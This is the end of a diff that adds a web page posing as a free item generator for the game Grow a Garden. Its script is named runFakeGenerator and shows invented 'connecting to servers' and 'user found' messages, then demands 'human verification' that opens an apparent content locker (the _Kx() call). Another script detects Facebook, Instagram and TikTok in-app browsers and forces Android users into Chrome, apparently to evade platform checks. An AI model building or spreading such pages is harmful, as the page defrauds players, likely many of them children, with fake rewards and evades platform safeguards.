+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Amber Spine -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/f/f8/AmberSpineCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Amber Spine</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Grand Volcania -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/5a/GrandVolcan.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Grand Volcania</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Giant Pinecone -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/e/e9/Giant_pinecone.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Giant Pinecone</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Candy Blossom -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/52/CandyBlossomPic.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Candy Blossom</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Burning Bud -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Burning Bud" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/9/98/Burning_Bud.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Burning Bud</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Dragon Pepper -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Dragon Pepper" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/6/62/DragonPepperIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Dragon Pepper</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Moon Melon -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Moon Melon" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/7/7a/MoonMelon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Moon Melon</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Sunflower Seed -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Sunflower Seed" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/c/c0/Sunflower_Produce_.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Sunflower Seed</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Sugar Apple -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Sugar Apple" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/a/a7/SugarAppleIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Sugar Apple</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Feijoa -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Feijoa" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/54/FeijoaIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Feijoa</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Loquat -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Loquat" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/9/9d/LoquatProduce.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Loquat</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Prickly Pear -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Prickly Pear" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/3/33/PricklyPear.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Prickly Pear</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+    <!-- Username Modal -->
+    <div class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop" id="username-modal">
+        <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full text-gray-800">
+            <h3 class="text-2xl font-bold mb-4 text-center font-fredoka text-green-600">Enter Your Username</h3>
+            <p class="text-center mb-6 text-gray-600">Please enter your username to claim your item.</p>
+            <input class="w-full px-4 py-2 border border-gray-300 rounded-lg mb-1 focus:outline-none focus:ring-2 focus:ring-green-500" id="username-input" placeholder="Your Username" type="text"/>
+            <p class="text-red-500 text-sm h-4 mb-2" id="username-error"></p>
+            <button class="w-full bg-green-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-green-600 transition-colors" id="submit-username-btn">Submit</button>
+            <button class="w-full bg-gray-200 text-gray-700 font-bold py-2 px-6 rounded-lg hover:bg-gray-300 transition-colors mt-2" id="close-modal-btn">Cancel</button>
+        </div>
+    </div>
+    <!-- Generator Modal -->
+    <div class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop" id="generator-modal">
+        <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full text-gray-800 text-center">
+            <h3 class="text-3xl font-bold mb-4 text-green-600 font-fredoka animate-pulse" id="generator-title">Generating Items...</h3>
+            <div class="relative w-20 h-20 mx-auto mb-4">
+                <div class="absolute w-full h-full border-4 border-green-300 rounded-full animate-spin" style="border-top-color: #10b981;"></div>
+                <img class="absolute inset-0 w-12 h-12 m-auto animate-bounce" id="loading-item-img" src="https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png"/>
+            </div>
+            <div class="progress-bar mb-4 bg-gray-200 rounded-full h-4 overflow-hidden">
+                <div class="progress-fill text-white text-sm text-center" id="progress-fill" style="width: 0%; line-height: 1rem;">0%</div>
+            </div>
+            <p class="text-gray-600 text-sm italic mb-4" id="game-tip"></p>
+            <button class="hidden w-full bg-blue-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-600 transition-colors" id="verify-btn">Verify Now</button>
+        </div>
+    </div>
+    <script>
+        // --- Countdown Timer ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const countdownElement = document.getElementById('countdown-timer');
+            let timeInSeconds = 120; // 2 minutes
+
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeInSeconds / 60);
+                let seconds = timeInSeconds % 60;
+
+                seconds = seconds < 10 ? '0' + seconds : seconds;
+
+                countdownElement.textContent = `${minutes}:${seconds}`;
+
+                if (timeInSeconds <= 0) {
+                    clearInterval(timer);
+                    countdownElement.textContent = "Time's up!";
+                }
+
+                timeInSeconds--;
+            }, 1000);
+        });
+
+        // --- Keep old logic working, just add dynamic sequence ---
+        let selectedItemImg = "https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png";
+
+        const claimButtons = document.querySelectorAll('.claim-btn');
+        const usernameModal = document.getElementById('username-modal');
+        const closeModalBtn = document.getElementById('close-modal-btn');
+        const submitUsernameBtn = document.getElementById('submit-username-btn');
+        const usernameInput = document.getElementById('username-input');
+        const usernameError = document.getElementById('username-error');
+        const loadingItemImg = document.getElementById('loading-item-img');
+
+        // Open Username Modal & detect clicked item
+        claimButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const card = button.closest('.card-bg');
+                const img = card.querySelector('img');
+                if (img) selectedItemImg = img.src;
+                usernameModal.classList.remove('hidden');
+            });
+        });
+
+        // Close Username Modal
+        closeModalBtn.addEventListener('click', () => {
+            usernameModal.classList.add('hidden');
+            usernameInput.value = '';
+            usernameError.textContent = '';
+        });
+
+        // Submit Username & Start Generator
+        submitUsernameBtn.addEventListener('click', () => {
+            const username = usernameInput.value.trim();
+            if (username !== '') {
+                usernameModal.classList.add('hidden');
+                usernameError.textContent = '';
+                loadingItemImg.src = selectedItemImg;
+                runFakeGenerator(username);
+            } else {
+                usernameError.textContent = 'Please enter a valid username.';
+            }
+        });
+
+        // --- Smooth Generator with 3-step sequence ---
+        async function runFakeGenerator(username) {
+            const generatorModal = document.getElementById('generator-modal');
+            const progressFill = document.getElementById('progress-fill');
+            const verifyBtn = document.getElementById('verify-btn');
+            const gameTip = document.getElementById('game-tip');
+            const generatorTitle = document.getElementById('generator-title');
+
+            generatorModal.classList.remove('hidden');
+            progressFill.style.width = "0%";
+            progressFill.textContent = "0%";
+            verifyBtn.classList.add('hidden');
+
+            let progress = 0;
+            generatorTitle.textContent = "> Connecting to Grow a Garden servers...";
+            gameTip.textContent = "";
+
+            await new Promise(r => setTimeout(r, 1500));
+            generatorTitle.textContent = `> Finding user: ${username}...`;
+            
+            await new Promise(r => setTimeout(r, 2000));
+            generatorTitle.textContent = "> User found. Preparing to generate items...";
+
+            while (progress < 100) {
+                await new Promise(r => setTimeout(r, 100));
+                progress += Math.floor(Math.random() * 5) + 1;
+                if (progress > 100) progress = 100;
+                progressFill.style.width = progress + "%";
+                progressFill.textContent = progress + "%";
+            }
+
+            setTimeout(() => {
+                generatorTitle.textContent = "Generation complete.";
+                gameTip.textContent = "Human verification required to prevent abuse.";
+                verifyBtn.classList.remove('hidden');
+            }, 500);
+        }
+    </script>
+    <script>
+        // --- Quantity Buttons (+ and - fully working) ---
+        document.querySelectorAll('.card-bg').forEach(card => {
+            const minusBtn = card.querySelector('.quantity-minus');
+            const plusBtn = card.querySelector('.quantity-plus');
+            const quantityDisplay = card.querySelector('.quantity-display');
+            let quantity = 0;
+
+            if (minusBtn && plusBtn && quantityDisplay) {
+                minusBtn.addEventListener('click', () => {
+                    if (quantity > 0) {
+                        quantity--;
+                        quantityDisplay.textContent = quantity;
+                    }
+                });
+                plusBtn.addEventListener('click', () => {
+                    quantity++;
+                    quantityDisplay.textContent = quantity;
+                });
+            }
+        });
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function(){
+            const verifyBtn = document.getElementById('verify-btn');
+            if (verifyBtn) {
+                verifyBtn.addEventListener('click', function(){
+                    _Kx(); // Open locker when Verify is clicked
+                });
+            }
+        });
+    </script>
+    <script>
+        // Floating items script
+        document.addEventListener('DOMContentLoaded', () => {
+            const container = document.createElement('div');
+            container.id = 'floating-items-container';
+            document.body.prepend(container);
+
+            const items = [
+                'https://static.wikia.nocookie.net/growagarden/images/5/54/Raccon_Better_Quality.png', // Raccoon
+                'https://static.wikia.nocookie.net/growagarden/images/5/52/CandyBlossomPic.png', // Candy Blossom
+                'https://static.wikia.nocookie.net/growagarden/images/c/c9/DragonflyIcon.png', // Dragonfly
+                'https://static.wikia.nocookie.net/growagarden/images/f/f8/T-Rex.png', // T-Rex
+                'https://static.wikia.nocookie.net/growagarden/images/4/4d/Kitsune_.png' // Moon Melon
+            ];
+
+            const itemCount = 15;
+
+            for (let i = 0; i < itemCount; i++) {
+                const img = document.createElement('img');
+                img.src = items[Math.floor(Math.random() * items.length)];
+                img.classList.add('floating-item');
+                
+                const size = Math.random() * 60 + 40; // size between 40px and 100px
+                img.style.width = `${size}px`;
+                img.style.height = 'auto';
+
+                const animationName = `float${Math.floor(Math.random() * 3) + 1}`;
+                img.style.animationName = animationName;
+                
+                const animationDuration = Math.random() * 20 + 15; // duration between 15s and 35s
+                img.style.animationDuration = `${animationDuration}s`;
+                
+                const animationDelay = Math.random() * -35; // negative delay
+                img.style.animationDelay = `${animationDelay}s`;
+
+                container.appendChild(img);
+            }
+        });
+    </script>
+  <script>
+    (function() {
+        // List of user agents for known in-app browsers
+        const inAppBrowserRegex = /MESSENGER|FBAN|FBAV|Instagram|WebView|musical_ly|TikTok/i;
+
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        // Check if the user is inside a known in-app browser
+        if (inAppBrowserRegex.test(userAgent)) {
+            
+            // --- Strategy for Android ---
+            // It uses a special "intent" URL to force open in a real browser
+            if (/android/i.test(userAgent)) {
+                const currentUrl = window.location.href;
+                // Try to open in Chrome, the most common Android browser
+                const intentUrl = "intent:" + currentUrl.substring(currentUrl.indexOf(':') + 1) + "#Intent;scheme=https;package=com.android.chrome;end";
+                window.location.href = intentUrl;
+            } 
+            
+            // --- Strategy for iOS ---
+            // iOS is more restrictive. We can't force a browser open.
+            // The best approach is to inform the user to do it manually.
+            else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                // You can show a message to the user here.
+                // For this to work, you need to add a hidden HTML element.
+                const iosPrompt = document.getElementById('ios-redirect-prompt');
+                if (iosPrompt) {
+                    iosPrompt.style.display = 'block';
+                }
+            }
+        }
+    })();
+    </script>
+</body>
+
+</html>
